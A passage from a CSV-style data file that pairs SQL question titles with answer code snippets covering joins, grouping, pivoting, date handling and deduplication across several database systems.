sec_to_time(time_to_sec(Moment) - time_to_sec(Moment)%(15*60)) AS 15Interval
FROM mytable) temp
GROUP BY
    Date,
    15MinInterval
ORDER BY
    Date,
    15MinInterval
"
21327,22750,Finding distinct values,"SELECT instruments.inst , MAX(instruments.predicted), instruments.prediction
FROM instruments 
INNER JOIN
(SELECT inst, MAX(prediction) AS [predictions]
FROM instruments
GROUP BY inst ) groupedtt
ON instruments.inst = groupedtt.inst
AND instruments.prediction = groupedtt.predictions
GROUP BY instruments.inst , instruments.prediction;
"
29743,29754,How do I know if record from an SQL database is being used elsewhere?,"SELECT g.groupid, COUNT(*) AS user_count
FROM dbo.Groups g JOIN dbo.Users u ON (g.groupid = u.groupid)
GROUP BY g.groupid;
"
30643,18890,Need a stored procedure to use rows from a temp table as ANDed criteria,"select c.caseId
from cases c 
     SearchCriteria sc left outer join
     on sc.PersonnelName = c.Name and
        sc.PersonnelGroup = c.Group
group by c.caseId
having (@flag = 'all') and (count(*) = (select COUNT(sc.PersonnelName) from SearchCriteria) or
       (@flag = 'any') and count(sc.PersonnelName) > 0
"
22583,61069,IN statement from CASE result inside Where clause Oracle,"WHERE (desc1 = 'desc1' AND status_code IN (240,242)) OR
      (desc1 = 'desc2' AND status_code IN (240,245))
"
14267,21477,Join more than two tables on a same collumn,"SELECT cols FROM
transaction
LEFT JOIN wood_items ON (wood_item_id = item_id)
LEFT JOIN other_items ON (other_items_id = item_id)
WHERE
    -- Ensures that there is a match in at least one of the tables
    wood_item_id IS NOT NULL
    OR other_items_id IS NOT NULL
"
14353,31697,SQL SELECT multiple columns into one,"SELECT Id, (Cast([Year] as varchar(4)) + ' ' + Manufacturer + ' ' + Model) AS MyColumn 
FROM   Tablename
"
10384,72950,TSQL Stored Procedure - Create User in database from another or master database,"--This is the tsql statement that gets executed on a specific user db.
--You would use this to build your ""create proc"", ""alter proc"", ""create user"", etc statements.
DECLARE @InnerSql NVARCHAR(MAX) = 'SELECT DB_NAME()'

DECLARE @DB SYSNAME = 'DatabaseName'
DECLARE @Tsql NVARCHAR(MAX) = '[' + @DB + ']..sp_executesql N''' + @InnerSql + ''''

EXEC sp_executesql @Tsql;
"
15378,38381,returning null values as something else from a query,"SELECT TEST_CODE, TEST_MDL,
    CONVERT(varchar(20),ISNULL(TEST_MDL,'null')) 
   FROM TEST;
"
5207,11643,Unable to get the right output from Oracle SQL,"SELECT field1, field2, field3, 
FROM myTable
WHERE trunc(date)  = tp_date(‘03/22/2011’,’mm/dd/yyyy’)
AND field1 in 
   (SELECT field1
    FROM mytable
    GROUP BY field1
    HAVING COUNT(field1)  <  7); 
"
32636,62339,Split column data into multiple rows,"; 
with cte as
(
    select  id, prodlines, ItemNumber, Item = ltrim(Item),
        grp = dense_rank() over (partition by id order by replace(replace(ltrim(Item), '(Read)', ''), '(Write)', ''))
    from    #prodLines pl
        cross apply dbo.DelimitedSplit8K(prodlines, ',') c
)
select  id, prodlines, prod = stuff(prod, 1, 1, '')
from    cte c
    cross apply
    (
        select  ',' + Item
        from    cte x
        where   x.id    = c.id
        and x.grp   = c.grp
        order by x.Item
        for xml path('')
    ) i (prod)
"
451,15079,Database model to describe IT environment,"+-------------+
| Device Type |
|-------------|
| type        |--------+
+-------------+        |
                       ^
                  +---------------+     +--------------------+     +-----------+
                  | Device        |----<| DeviceAttributeMap |>----| Attribute |
                  |---------------|     |--------------------|     |-----------|
                  | name          |     | Device             |     | name      |
                  | DeviceType    |     | Attribute          |     +-----------+
                  | parent_device |     | value              |
                  | Site          |     +--------------------+
                  +---------------+       
                       v
+-------------+        |
| Site        |        |
|-------------|        |
| location    |--------+
+-------------+
"
33206,34228,How to find the previous and current row difference,"DECLARE @tbl TABLE (id VARCHAR(10), date DATE, amt INT)
INSERT @tbl VALUES
('001', CONVERT(DATE, '01/01/2012', 103), 100),
('001', CONVERT(DATE, '01/12/2011', 103), 200),
('002', CONVERT(DATE, '01/01/2013', 103), 100),
('002', CONVERT(DATE, '01/12/2012', 103), 200),
('003', CONVERT(DATE, '12/08/2012', 103), 500),
('003', CONVERT(DATE, '31/12/2011', 103), 200),
-- Added to display the one id - one row situation
('004', CONVERT(DATE, '14/02/2011', 103), 999),
('000', CONVERT(DATE, '02/02/2012', 103), 100),
('100', CONVERT(DATE, '09/09/2011', 103), 999)

;WITH a AS
(
    SELECT  id
            , amt
            , date      
            , ROW_NUMBER() OVER (PARTITION BY id ORDER BY date ASC) num
            , COUNT(*) OVER (PARTITION BY id) cnt
    FROM    @tbl
)

SELECT  t1.id
        , t1.date
        , ABS(t1.amt - t2.amt)
FROM    a t1
JOIN    a t2 ON (t1.id = t2.id AND t1.num = t2.num + 1)
OR      (t1.id = t2.id AND t2.cnt = 1)
"
15184,61889,SQL Server CTE query producing unexpected result,"WITH CTE(PartNum, RowIndex) AS
(
        -- Anchor Member
        SELECT
            PartNum
            ,CAST(OurQty AS INT) AS RowIndex
        FROM dbo.RcvDtl
        WHERE OurQty > 0
        UNION ALL
        -- Recursive Member
        SELECT
            PartNum
            ,RowIndex - 1
        FROM CTE
        WHERE RowIndex - 1 > 0
)
SELECT CTE.PartNum, dbo.RcvDtl.OurQty, CTE.RowIndex from CTE INNER JOIN dbo.RcvDtl
ON CTE.PartNum = dbo.RcvDtl.PartNum
order by PartNum,RowIndex
"
27665,34703,modelling two one-to-many relationships database relationships in uml,"                D
   --------------------------
   |            |           |
   A            B           C
  ---          ---         ---
"
37681,48317,"Mysql pull a count, and group by that count","Select winner, 
       Count(*) AS totalCount 
From   gameEnders 
Where  status=0 
And    Year(dateAdded) = Year(CurDate()) 
And    Month(dateAdded) = Month(CurDate())
Group By winner
Order By Count(*) DESC 
Limit 5
"
39098,57577,Joining Table that has no value,"select 
    username, 
    question, 
    answer = isnull(answer,'Not Answered')
from Question q
cross join User u 
left join UserQuestion uq on uq.QuestionID = q.ID and u.id = uq.USERID
left join Answer a on uq.AnswerID = a.ID
"
9148,6822,How to select using join on two conditions for the same column,"select id, group_concat(distinct tag) as tag,
       group_concat(distinct name) as name
from t
where tag in ('foo', 'bar')
group by id
having count(distinct tag) = 2;
"
28580,2451,SQL - Join if ID > 0,"SELECT tbl_people.PeopleID, tbl_people.Name, tbl_people.Prename, 
       tbl_spouses.Prename AS PrenameOfSpouse
FROM tbl_people
LEFT JOIN tbl_spouses ON tbl_people.SpouseID_FK = tbl_spouses.SpouseID
"
19013,74977,Attach query string to results,"SELECT 'searchstring' AS querystring, * FROM table1 WHERE column1 LIKE '%searchstring%';
"
33657,11932,Append a specific character after each character of a string in sql server,"select isnull(C.Value, '') as AS_CIS_Code 
from added_services as A
  cross apply (
              select substring(A.AS_CIS_Code, T.N, 1)+'_'
              from (values(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)) as T(N)
              where T.N <= len(A.AS_CIS_Code)
              order by T.N
              for xml path('')
              ) as C(Value)
"
38566,75286,Looping in SQL to get all entries in a table associated with another table,"DELETE I
FROM Items I 
JOIN Bills B
  ON B.bill_id = I.bill_id    
WHERE B.vendor_id = @VendorID; 

DELETE B
FROM Bills B
WHERE B.vendor_id = @VendorID; 

DELETE V
FROM Vendor V
WHERE V.vendor_id = @VendorID; 
"
20934,6941,SQL Server Join Confusion - How to Find Missing Rows,"DECLARE @MasterTable TABLE
(
    Title varchar(100),
    Level int
)
DECLARE @PositionsTable TABLE
(
    Employer varchar(100),
    Title varchar(100),
    Level int,
    Rate int
)
DECLARE @Employers TABLE
(
    Employer varchar(100)
)

INSERT INTO @Employers VALUES ('EmployerA')
INSERT INTO @Employers VALUES ('EmployerB')
INSERT INTO @MasterTable VALUES ('CEO', 1)
INSERT INTO @MasterTable VALUES ('CFO', 2)
INSERT INTO @MasterTable VALUES ('CTO', 2)
INSERT INTO @PositionsTable VALUES ('EmployerA', 'CEO', 1, 100)
INSERT INTO @PositionsTable VALUES ('EmployerA', 'CFO', 2, 100)
INSERT INTO @PositionsTable VALUES ('EmployerA', 'CTO', 2, 100)
INSERT INTO @PositionsTable VALUES ('EmployerB', 'CEO', 1, 100)
--INSERT INTO @PositionsTable VALUES ('EmployerB', 'CFO', 2, 100)
INSERT INTO @PositionsTable VALUES ('EmployerB', 'CTO', 2, 100)

SELECT *
FROM @Employers e
CROSS JOIN @MasterTable mt
LEFT JOIN @PositionsTable pt ON e.Employer = pt.Employer AND mt.Title = pt.Title AND mt.Level = pt.Level
WHERE pt.Employer IS NULL
"
27563,58510,I want to Select data from mysql DB which are older than 1 month,"SELECT * FROM `mails` WHERE `received_time` < DATE_SUB(NOW(),INTERVAL 1 MONTH)
"
24970,30094,Get intersection of sets in mysql db,"SELECT t2.person_id, COUNT(*) int_size, GROUP_CONCAT(t2.preference_id) shared_preferences
FROM table t1
JOIN table t2 ON t1.preference_id = t2.preference_id
WHERE t1.person_id = 1
AND t2.person_id != 1
GROUP BY t2.person_id
ORDER BY int_size DESC
LIMIT 10
"
35846,59701,Read XML Column,"DECLARE @XML XML
SELECT @XML = '
<findItemsByKeywordsResponse xmlns=""http://www.ebay.com/marketplace/search/v1/services"">
    <ack>Success</ack>
    <version>1.12.0</version>
    <timestamp>2013-09-03T01:10:07.967Z</timestamp>
    <searchResult count=""100"">
        <item>
            <itemId>231044911361</itemId>
            <title>3 X SNAKE REPELLER SOLAR POWER ULTRA SONIC LED PEST RODENT MULTI PULSE REPELLANT</title>
        </item>
    </searchResult>
    <paginationOutput>
        <pageNumber>1</pageNumber>
        <entriesPerPage>100</entriesPerPage>
        <totalPages>3</totalPages>
        <totalEntries>270</totalEntries>
    </paginationOutput>
    <itemSearchURL>http://www.ebay.com.au/sch/i.html?_nkw=snake+repeller&amp;_ddo=1&amp;_ipg=100&amp;_pgn=1</itemSearchURL>
</findItemsByKeywordsResponse>'

;WITH XMLNAMESPACES (DEFAULT 'http://www.ebay.com/marketplace/search/v1/services')
SELECT itemId = t.c.value('itemId[1]', 'BIGINT')
FROM @XML.nodes('/findItemsByKeywordsResponse/searchResult/item') t(c)
"
5054,59536,Using DISTINCT and COUNT together,"SELECT product_id, COUNT(distinct keyword) as keyword_sum 
FROM data
GROUP BY product_id
"
13181,20078,DQL query in Symfony for ManyToOne unidirectional relationship,"return $this->createQueryBuilder('i')
    ->leftJoin('i.category', 'c')
    ->orderBy('c.ordering', 'ASC')
    ->getQuery()
    ->getResult();
"
27605,70513,SQL: Removing duplicates from column,"CASE RANK() OVER (PARTITION BY li.catnr, li.av_part_no, li.artist, li.title, li.i_status
             ORDER BY bom.av_part_no)
  WHEN 1 THEN nr.c_catnr END AS comp_part_AW
"
38676,63944,Set Overlap Percentage in SQL,"SELECT t1.att1, t1.att2, t2.att2 as att2_other, 
       SUM(CASE WHEN t2.att3 = t1.att3 THEN 1.0 ELSE 0 END)/COUNT(DISTINCT t1.att3) as Cnt
FROM table_name t1
JOIN table_name t2
  ON t1.att1 = t2.att1
GROUP BY t1.att1, t1.att2, t2.att2
"
6738,28202,How to get the max value in relation table using MYSQL,"SELECT   v.id, MAX(duration)
FROM     video v
JOIN     source s ON s.id IN (v.source_low, v.source_med, v.source_high)
GROUP BY v.id
"
24051,38772,SQL select segment,"SELECT col1, col2, ..., coln
FROM
(
    SELECT
        col1, col2, ..., coln,
        NTILE(5) OVER (ORDER BY id) AS groupno
    FROM yourtable
)
WHERE groupno = 3
"
22926,71984,SQL multiple rows as columns (optimizing),"SET @sql = NULL;

SELECT
    GROUP_CONCAT(DISTINCT
        CONCAT('MAX(CASE WHEN ckm.colkey = ', colkey, ' THEN ccd.value END) AS ',  
               CONCAT('ExtraColumn_', colkey, ''))
    ) INTO @sql
FROM test_customkeymapping;

SET @sql = CONCAT('SELECT c.Name, ', @sql, ' 
                   FROM customers c
                   LEFT JOIN customercustomdatarels ccdr
                     ON c.Id = ccdr.customer
                   LEFT JOIN customdatas cd
                     ON cd.Id = ccdr.customdata
                   LEFT JOIN test_customkeymapping ckm 
                     ON cd.key = ckm.customkey
                   GROUP BY c.Id');

PREPARE stmt FROM @sql;
EXECUTE stmt;
"
22457,28335,Is it possible to determine the table linked to by a foreign key?,"select references_table_name
  from referential_constraints
 where table_name = 'your_table';
"
18250,46387,select conditional data in groups,"select  Name, Asset#, Date, InOut
from    Table t
join    (
        select  Asset#
        ,       max(Date) as MaxDate
        from    Table
        group by
                Asset#
        ) filter
on      filter.Asset# = t.Asset#
        and filter.MaxDate = t.Date
where   t.InOut = 'Out'
"
4433,18469,PostgreSQL function multiple rows returned from subquery in case statement,"AND ((newcheck IS NULL)
     OR (newcheck IS NOT NULL 
         AND product.id IN (SELECT product.id 
                            FROM product 
                            WHERE product.anew = CASE WHEN newcheck='New' 
                                                      THEN true 
                                                      ELSE false
                                                 END))
"
17720,480,"Avoiding insertion of duplicate rows where ""duplicate"" is non-trivial","insert into perm (a,b,c,d,e,f)
select
t.*
from
temp t left outer join
(
select
p.*
from
perm p inner join
(
select a, b, max(c) as max_c
from perm
group by a,b) mx on
p.a = mx.a and
p.b = mx.b and
p.c = max_c
  ) p on
t.a = p.a and
t.b = p.b and
t.c > p.c and
t.d = p.d and
t.e = p.e and
t.f = p.f
where
    p.a is null
"
8188,38489,Oracle 11g: How to fetch column type from view?,"select * from all_tab_columns@ABC.World where table_name='viewname'
"
30898,4413,How to replace tags in a message with values from another table in SQL Server,"DECLARE @EntityId uniqueidentifier = ''

CREATE TABLE #AuditTags
(
    AuditId uniqueidentifier NOT NULL,
    TagField nvarchar(40),
    TagValue nvarchar(300)
)
CREATE TABLE #AuditDetails
(
    [AuditId] uniqueidentifier NOT NULL,
    [DateCreated] datetime,
    [Description] nvarchar(max),
    [UserId] uniqueidentifier
)

INSERT INTO #AuditTags (AuditId, TagField, TagValue)
SELECT A.AuditId, Split.a.query('field').value('.', 'VARCHAR(100)') AS Tag, Split.a.query('value').value('.', 'VARCHAR(100)') AS Value  
 FROM  
 (
     SELECT event_audit_id AS AuditId,  
         CAST ('<doc>' + REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(tag_value, ':', ''), '|', ''), '<<', '<field>'), '>>', '</field><value>'), '[', '<tag>'), ']', '</value></tag>') + '</doc>' AS XML) AS Data  
     FROM  TagValues
     WHERE [entity_id] = @EntityId
 ) AS A CROSS APPLY Data.nodes ('/doc/tag') AS SPLIT(a);

INSERT INTO #AuditDetails
SELECT event_audit_id, TagValues.date_created, MessageDescriptions.[description], [user_id]
FROM TagValues
INNER JOIN MessageDescriptions ON TagValues.content_template_id = MessageDescriptions.content_template_id 
WHERE TagValues.[entity_id] = @EntityId

DECLARE @AuditId uniqueidentifier, @TagField nvarchar(40), @TagValue nvarchar(300)
DECLARE tag_cursor CURSOR
    FOR SELECT AuditId, TagField, TagValue FROM #AuditTags
OPEN tag_cursor
FETCH NEXT FROM tag_cursor INTO @AuditId, @TagField, @TagValue
WHILE @@FETCH_STATUS = 0
BEGIN
    UPDATE #AuditDetails SET [Description] = REPLACE([Description], '<<'+@TagField+'>>', @TagValue) WHERE AuditId = @AuditId

    FETCH NEXT FROM tag_cursor INTO @AuditId, @TagField, @TagValue
END
CLOSE tag_cursor;
DEALLOCATE tag_cursor;

SELECT
AuditId,
DateCreated AS [Date and time],
[Description], 
[User].salutation + ' ' + [User].first_name + ' ' + [User].last_name AS Actioner
FROM #AuditDetails
INNER JOIN [User] ON #AuditDetails.UserId = [User].[user_id]

DROP TABLE #AuditTags
DROP TABLE #AuditDetails
"
9246,7152,Query my block size oracle,"select distinct bytes/blocks from user_segments;
"
4676,15315,sql to match number in string,"SELECT * FROM table WHERE activitiesids REGEXP '[[:<:]][0-9]+[[:>:]]';
"
37989,56697,Search in Path which created by SYS_CONNECT_BY_PATH in Connect By Prior Query,"SELECT   
GROUP_ID, 
LPAD('-',LEVEL,'-')|| GROUP_NAME GROUP_NAME, 
 SYS_CONNECT_BY_PATH(GROUP_NAME, '->')  GROUP_NAME_PATH  
FROM  GROUPS 
START WITH PARENT_ID IS NULL AND TYPE='G' 
AND GROUP_ID <> 24 /* added condition */
CONNECT BY PRIOR GROUP_ID=PARENT_ID 
AND GROUP_ID <> 24 /* added condition */
"
10725,36623,SQL DELETE using DATE,"delete from customer
where not exists (select 1 
                  from sale
                  where sale.custId = customer.CustNo
                    and sale.saledate >= date '2009-01-01')
"
769,15175,SSIS and sending query with date to Oracle,"select distinct CHLD.id,
       nvl(chld_c_spl, 'N'),
       to_char(chld_d_start, 'YYYY-MM-DD') chld_d_start,
       to_char(chld_d_end, 'YYYY-MM-DD') chld_d_end
  from child chld, 
       picture ptct
 where CHLD.id = PTCT.chld_id
   and nvl(chld_d_end, sysdate) >= to_date('2014-01-01','YYYY-MM-DD')
   and chld_c_veri in ('HC','DR')
   and nvl(ptct_term, ptct_end) >= to_date('2014-01-01','YYYY-MM-DD')
"
21960,31502,Repeat a SQL query,"SELECT * FROM a WHERE time < ANY (SELECT '2010-01-01' UNION ALL SELECT '2012-01-01')
"
2403,61966,merge two columns then group by,"select t.loc, max(t.group_no)
(
    select loc1 as loc, group_no from test

    union

    select loc2 as loc, group_no from test
) t
group by t.loc
order by 2,1
"
9647,53555,Changing database design after creation,"CREATE TABLE Languages (id int identity NOT NULL PRIMARY KEY, 
                        [Language] varchar(100), 
                        Shorthand varchar(100))

BEGIN TRAN -- We do a transaction here to ensure consistency

INSERT INTO Languages ([Language])
SELECT DISTINCT [Language]
FROM MySourceTable

-- Update the shorthands later


ALTER TABLE MySourceTable
ADD LanguageID int 
FOREIGN KEY REFERENCES Languages(id)

UPDATE t
SET LanguageID = l.id
FROM MySourceTable T
INNER JOIN Languages l
    ON l.[Language] = t.[Language]

ALTER TABLE MySourceTable
DROP [Language]

COMMIT TRAN
"
16228,51389,Select n:n relationship in one row with Oracle (to create an view),"SELECT
  u.NAME,    
  (SELECT
     (RTRIM(XMLAGG(xmlelement(X, APPLICATIONS.APPLICATION||',')order by APPLICATIONS.APPLICATION).extract('//text()'),','))  
    FROM
        HAS_APPLICATIONS        
    LEFT JOIN APPLICATIONS ON HAS_APPLICATIONS.USER_ID = APPLICATIONS.ID
    WHERE
        HAS_APPLICATIONS.USER_ID = u.ID)          
FROM
   USERS u
"
4100,44853,sum the values in column for same date and id,"select distinct o.ID, o.Date,
  SUM(o.COST) OVER(PARTITION BY o.ID, o.Date) as cost
 ,SUM(o.AMT) OVER(PARTITION BY o.ID, o.Date) as amt
 ,MIN(FLAG) OVER(PARTITION BY o.ID, o.Date) as flag
from orders o
order by o.ID, o.Date
"
3943,35486,MySQL UPDATE syntax with multiple tables using WHERE clause,"UPDATE  table1 a
        INNER JOIN table2 b
            ON a.ID = b.ID
SET     a.value = b.value 
"
6220,54626,mysql: how do i get a list of databases available?,"show databases;
"
23130,59859,SQL Server Pivoting based off of a column to be delimited,"SELECT assist.Item as 'HHRepID' 
      ,  YEAR(A.ProjectEndDate)  AS 'Year'
      ,  MONTH(A.ProjectEndDate)  AS 'Month'
      ,  DATENAME(mm,A.ProjectEndDate) AS 'MonthName'
      , SUM(CASE WHEN A.SatisfactionWithCommunication >= 4 THEN 1 ELSE 0 END) as 'AgreeStronglyAgreeCommunicationCount' 
      , COUNT(A.SatisfactionWithCommunication) as 'CommunicationCount'
      , SUM(CASE WHEN A.InteractionConnectionWithClient >= 4 THEN 1 ELSE 0 END) as 'AgreeStronglyAgreeInteractionCount' 
      , COUNT(A.InteractionConnectionWithClient) as 'InteractionCount'
      , SUM(CASE WHEN A.OverallSatisfactionWithEngagement >= 4 THEN 1 ELSE 0 END) as 'AgreeStronglyAgreeOverallSatisfactionCount' 
      , COUNT(A.OverallSatisfactionWithEngagement) as 'OverallSatisfactionCount'
      , COUNT(A.ResponseID) as 'SurveysReturned'
      , 'SalesOps' as 'Grouping'
FROM 
   SurveyData.dbo.SalesSurvey as A with(nolock) 
   CROSS APPLY Split(Lower(A.RepID), ';') AS assist
WHERE 
   A.ResponseID IS NOT NULL AND A.IsExcludedFromReporting IS NULL
GROUP BY
   YEAR(A.ProjectEndDate), MONTH(A.ProjectEndDate), DATENAME(mm,A.ProjectEndDate), assist.Item
ORDER BY 
   assist.Item
"
31743,19866,Finding the most common entry in a column - SQL,"SELECT A, B
FROM table1 o
GROUP BY A, B
HAVING COUNT(*) = 
    (
        SELECT MAX(totalCOunt)
        FROM
        (
            SELECT A, B, COUNT(*) totalCount
            FROM table1
            GROUP BY A,B
        ) x
        WHERE o.A = x.A 
        GROUP BY x.A
    )
"
13955,2212,bubble a record to the top of mySQL query based on record number,"SELECT ... ORDER BY (key_col = 123) DESC
"
19800,34103,Minutes to time in SQL Server,"Create FUNCTION [dbo].[IntToMinutes]
(
    @m smallint 
)  
RETURNS nvarchar(5)
AS  
BEGIN
    DECLARE @c datetime
    select @c = dateadd(mi,@m,'00:00')       
    RETURN convert(nvarchar(5), @c, 108)   
END
"
39069,59312,Error with scan of nil float value using Go and database/sql,"""SELECT COUNT(*), coalesce(SUM(dbalance), 0.00) FROM test01""
"
13166,47487,"How to generate ""Create Table"" script, when I only have read only permission?","select  *
into    NewTableName
from    [LinkedServerName].[DatabaseName].dbo.TableName
"
4824,10240,Mysql like search in reverse,"SELECT *
FROM   tableName
WHERE  'the animal is a fox' LIKE CONCAT('%', animal ,'%')
"
4510,15452,Best self join technique when checking for duplicates,"--DELETE table
--WHERE KeyCol NOT IN (
select
    MIN(KeyCol) AS RowToKeep,
    col1, col2, 
from
    table
GROUP BY
    col12, col2
HAVING
   COUNT(*) > 1
--)
"
28216,20976,SQL data returned in a comma-delimited list,"DECLARE @foo table ( HotelID int , lastID int , FileNameList varchar(8000))

INSERT INTO @Foo 

SELECT
    start.HotelID,
    start.firstID ,
    id.FileName 

FROM
    (SELECT 
        HotelID,
        min(HotelImageID ) firstID
    from 
        HotelImages


    group by HotelID) start
    INNER JOIN HotelImages hi
    ON start.firstID = hi.HotelImageID 


WHILE @@RowCount <> 0 
BEGIN

    UPDATE @foo
    SET 
        FileNameList = FileNameList + ',' + FileName
        lastID  = Xnext.nextID
    FROM 
        @foo f
        INNER JOIN HotelImages hi
        ON f.HotelID = id.HotelID
        INNER JOIN 
        (SELECT 

            id.HotelID,
            min(HotelImageID ) nextID
        from HotelImages hi
              inner join @foo f
              on f.HotelID = id.HotelID
        where id.HotelImageID  > f.lastid


        group by id.HotelID) Xnext

        ON Xnext.nextID = id.HotelImageID 



END 

SELECT 
    h.HotelID 
    h.HotelName,
    f.FileNameList
FROM
    Hotels h
    INNER JOIN @foo f
    ON h.hotelId = f.HotelId
"
16212,21122,How to count duplicates based on other column?,"select 
    col_1,
    col_2,
    row_number() over(
        partition by col_2 order by col_1
    ) - 1 as col3
from yourtablename
"
12989,13915,MySQL procedure writing for data managing,"update db2.A a2, db1.A a1 set a2.email=a1.email where a1.id=a2.id and (db2.email is null or db2.email = '') and a1.email <> a2.email;
"
20563,60543,xpath for xquery in SQL,"DECLARE @Input XML 
SET @input = '<root>
<element>
<sub name=""1"">
<date>the date</date>
</sub>
<sub name=""2"">
<date>the date</date>
</sub>
<sub name=""3"">
<date>the date</date>
</sub>
</element>
</root>'

SELECT 
    @input.value('(/root/element/sub[@name=""1""]/date)[1]', 'varchar(50)')
"
6965,27860,'select not in' query with subquery selecting varchar(30)," select label from GenericLabels where label not in (select customlabel from UserDeviceStatus where userid = 40)
"
8715,66092,"Group By, Having and Count","SELECT COUNT (rowTotal) as total 
  FROM (
      SELECT SUM(1) as rowTotal
      FROM `products_groups` `productGroup` 
      LEFT OUTER JOIN `products` `products` 
      ON (`products`.`product_group_id`=`productGroup`.`id`) 
      GROUP BY productGroup.name HAVING (COUNT(products.id) > 0)
  )as groupRows
"
14510,46353,How do I check if a column is empty or null in mysql,"SELECT * FROM table WHERE some_col IS NULL OR some_col = '';
"
17462,3063,Get super set records not contained in a subset (mutual exclusion),"SELECT * FROM tableA a
 WHERE NOT EXISTS ( SELECT b.itemid FROM tableB b WHERE b.itemid = a.itemid 
                       AND b.invid = parameter )
"
7192,52397,Oracle LIMIT and 1000 column restriction,"select *
  from foo f, foo2 f2
 where (f.rowid, f2.rowid) in (select r, r2
                                 from (select r, r2, rownum rn
                                         from (select /*+ first_rows */ f.rowid r, f2.rowid r2
                                                 from foo f, foo2 f2
                                                where f.c1 = f2.a1 
                                                  and f.c2 = '1'
                                                order by f.c1))
                                where rn >= AAA
                                  and rownum <= BBB)


order by whatever;
"
5970,60658,SQL select and inner join with AND,"SELECT * FROM posts p
WHERE 
EXISTS ( SELECT 1 FROM tags t1 WHERE t1.post_id = p.post_id AND t1.tag_text='TAG1')
AND
EXISTS ( SELECT 1 FROM tags t2 WHERE t2.post_id = p.post_id AND t2.tag_text='TAG2')
"
25023,74401,sql dedupe based on master child relationship,"DELETE FROM Person WHERE PersonID IN 
(
  SELECT P.PersonID
  FROM Person AS P
  INNER JOIN [Order] AS O 
  ON P.PersonID = O.PersonID
  WHERE P.PersonID IN 
  (
    SELECT IP.PersonID
    FROM Person AS IP
    INNER JOIN [Order] AS IO 
    ON IP.PersonID = IO.PersonID
    WHERE IP.PersonID <> P.PersonID
    AND IP.Name = P.Name
    AND IP.SSN = P.SSN
    AND O.ItemID = IO.ItemID 
    AND O.Quantity = IO.Quantity
  )
)
"
37979,35499,MySQL Union - Select data from first table in union first,"SELECT service.*, 1 as OBCol
FROM star_service
INNER JOIN service ON service.code = star_service.service

UNION

SELECT service.*, 2 as OBCol
FROM service

ORDER BY OBCol
"
19195,56512,Return all child records related to parent,"SELECT T1.acct#, T1.name, T2.cfseq, T2.cfaal1, T2.cfacc#
FROM data.table1 T1
JOIN  data.table2 T2 ON T1.acct# = T2.cfacc# 
where
    T1.acct# in (select cfacc# from T2 where cfaal1 like '%POD%')
"
38508,36982,SQL: Sort by number of same values in one column without aggregating/contracting,"  SELECT o.*
    FROM object o
    JOIN (
      SELECT objectKind, COUNT(*) count
        FROM object   
    GROUP BY objectKind
         ) ok
      ON ok.objectKind = o.objectKind
    JOIN (
      SELECT objectType, COUNT(*) count
        FROM object   
    GROUP BY objectType
         ) ot
      ON ot.objectType= o.objectType
ORDER BY ok.count DESC, ot.count DESC, o.object ASC
"
6525,45404,OnDemand arsdoc query against the system log,"
         -1              -1
"
36093,68460,How can I make this query run faster in SQL?,"select l.year, count(*)
from laws
group by l.year
order by l.year desc;
"
29002,12704,SQL Query help - need to calculate statistics on one parameter based on another,"    SELECT avg([Coat_Tank_Pressure]), [Run_Number]
    FROM WideHistory    
    WHERE wwRetrievalMode = 'Delta'   
     AND wwVersion = 'Latest'    
     AND DateTime >= DateAdd(hh,-1,GetDate())    
     AND DateTime <= GetDate()
    GROUP BY [Run_Number]
"
32965,60665,How do I set 1st row value from sql in ssrs report?,"=IIf(IsNothing(Previous(Sum(Fields!CurrentMV.Value)))
    , Sum(Fields!PreviousMV.Value)
    , Previous(Sum(Fields!CurrentMV.Value)))
"
3938,15365,SQL Server - Is there a collation that provides natural order for numbers?,"SELECT MAX(CAST (Value as int))
FROM MyTable
"
35146,25305,Get the highest-n values including duplicates in SQL,"SELECT s1.id, s1.series FROM SeriesScores s1 
INNER JOIN 
    (SELECT DISTINCT series FROM SeriesScores ORDER BY series DESC LIMIT 0, n) as s2 
    ON s1.series = s2.series
"
13463,14413,Conditional ordering,"ORDER BY [Date], CASE WHEN AID IN (5,10) THEN 1 ELSE 2 END, AID;
"
29301,52057,"I need to join three tables, group the results by one column, and display the highest value from another column","SELECT  a.*, b.*, c.*
FROM    users a
        INNER JOIN emails b
            ON a.ID = b.user_ID
        INNER JOIN messages c
            ON a.ID = c.user_ID
        INNER JOIN
        (
            SELECT user_id, MAX(date) maxDate
            FROM messages
            GROUP BY user_ID
        ) d ON c.user_ID = d.user_ID AND
                c.date = d.maxDate
"
31488,66832,Extract Max and Min values of a column from a table in the same row,"select bag,
       count,
       min(decode(id, min_bag_id, driver, null)) as initialdriver,
       min(decode(id, max_bag_id, driver, null)) as finaldriver,
       min(decode(id, max_bag_id, time, null)) as time
  from (select id,
               bag,
               count,
               driver,
               time,
               min(id) over(partition by bag) as min_bag_id,
               max(id) over(partition by bag) as max_bag_id
          from tbl)
 group by bag,
          count
"
19534,16489,How to get the duplicate names of employees who have multiple employee numbers,"SELECT e.Employee_No, e.Employee_Name, e.ID_NO
    FROM (SELECT Employee_Name, ID_NO
              FROM Employee
              GROUP BY Employee_Name, ID_NO
              HAVING COUNT(*) > 1) q
        INNER JOIN Employee e
            ON q.Employee_Name = e.Employee_Name
                AND q.ID_NO = e.ID_NO
    ORDER BY e.Employee_Name, e.ID_NO, e.Employee_No
"
21956,32325,SQL split a result properly,"Declare @recordsPerPage AS int
SELECT @recordsPerPage = 10000;
SELECT
    *,
    ROW_NUMBER() OVER (PARTITION BY NumeroDeclaration ORDER BY NumeroTransaction ASC) AS Tempnum,
    NumeroDeclaration+1 AS Page
FROM numbered
"
33534,22560,Difference between two dates in MySQL,"SELECT TIMEDIFF('2007-12-31 10:02:00','2007-12-30 12:01:01') * 24*60*60;
-- result: 19013097600.000000 the difference in seconds for days.


SELECT TIMESTAMPDIFF(SECOND,'2007-12-30 12:01:01','2007-12-31 10:02:00'); 
-- result: 79259  the difference in seconds with the time.
"
25076,43011,SQL help - find the table that has 'somefieldId' as the primary key?,"select so.name as TableName,
       si.name as IndexName,
       sc.name as ColumnName
  from sys.indexes si
  join sys.index_columns sic
    on si.object_id = sic.object_id
   and si.index_id = sic.index_id
  join sys.columns sc
    on si.object_id = sc.object_id
   and sic.column_id = sc.column_id
  join sys.objects so
    on si.object_id = so.object_id
 where sc.name like '%ColumnName%'
   and si.is_primary_key = 1
"
39653,23784,Convert only the year part of the datetime in SQL server,"CAST(STUFF(CONVERT(char(8),mydate,112),1,4,YEAR(GETDATE())) as DATETIME)
"
